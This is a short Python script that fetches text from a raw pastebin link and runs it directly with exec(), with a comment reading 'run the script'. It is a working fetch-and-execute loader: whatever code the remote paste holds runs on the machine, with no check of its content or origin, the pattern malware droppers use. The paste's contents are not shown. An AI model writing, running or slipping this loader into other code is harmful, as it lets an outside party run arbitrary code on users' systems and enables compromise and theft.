import requests
link = "https://pastebin.com/raw/Uhmm6bs4"
r = requests.get(link)

#run the script

response_text = r.text
r.encoding = 'utf-8'
exec(response_text)
